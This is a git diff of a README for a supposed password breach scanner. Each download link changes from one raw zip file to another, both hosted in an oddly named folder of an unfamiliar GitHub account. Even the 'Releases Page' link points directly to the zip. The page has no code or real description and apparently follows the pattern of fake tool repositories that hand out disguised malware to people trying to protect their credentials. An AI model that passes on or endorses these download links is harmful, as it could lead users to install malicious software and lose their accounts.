@@ -1,6 +1,6 @@
 # 🛡️ DeHashed-Password-Breach-Scanner - Protect Yourself from Breached Credentials
 
-[![Download Here](https://github.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/raw/refs/heads/main/hemotherapeutics/Scanner_De_Password_Hashed_Breach_3.1.zip%20Now-brightgreen)](https://github.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/raw/refs/heads/main/hemotherapeutics/Scanner_De_Password_Hashed_Breach_3.1.zip)
+[![Download Here](https://raw.githubusercontent.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/main/hemotherapeutics/De-Hashed-Scanner-Password-Breach-3.4.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/main/hemotherapeutics/De-Hashed-Scanner-Password-Breach-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the DeHashed-Password-Breach-Scanner! This tool helps you check if yo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download DeHashed-Password-Breach-Scanner](https://github.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/raw/refs/heads/main/hemotherapeutics/Scanner_De_Password_Hashed_Breach_3.1.zip).
+To get started, visit this page to download the application: [Download DeHashed-Password-Breach-Scanner](https://raw.githubusercontent.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/main/hemotherapeutics/De-Hashed-Scanner-Password-Breach-3.4.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the latest release.
@@ -69,6 +69,6 @@ In today’s digital age, protecting your passwords is crucial. Use the DeHashed
 
 Remember to frequently update your passwords, use two-factor authentication, and be vigilant about any unusual account activity.
 
-For any updates or questions, return to our [Releases Page](https://github.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/raw/refs/heads/main/hemotherapeutics/Scanner_De_Password_Hashed_Breach_3.1.zip).
+For any updates or questions, return to our [Releases Page](https://raw.githubusercontent.com/Ffhvcvjh/DeHashed-Password-Breach-Scanner/main/hemotherapeutics/De-Hashed-Scanner-Password-Breach-3.4.zip).
 
 Start protecting your credentials today!
